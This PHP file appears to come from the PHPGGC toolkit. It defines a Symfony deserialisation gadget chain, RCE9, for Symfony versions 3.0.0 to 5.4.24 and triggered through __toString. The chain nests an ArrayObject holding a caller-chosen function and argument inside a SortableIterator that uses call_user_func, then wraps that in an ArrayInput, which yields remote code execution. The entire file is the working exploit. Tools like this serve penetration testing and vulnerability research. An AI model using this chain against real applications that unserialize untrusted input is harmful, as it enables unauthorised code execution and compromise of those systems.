<?php

namespace GadgetChain\Symfony;

class RCE9 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.0.0 <= 5.4.24';
    public static $vector = '__toString';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \ArrayObject([
            $parameters["function"],
            $parameters["parameter"]
        ]);
        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
        $c = new \Symfony\Component\Console\Input\ArrayInput($b);
        return $c;
    }
}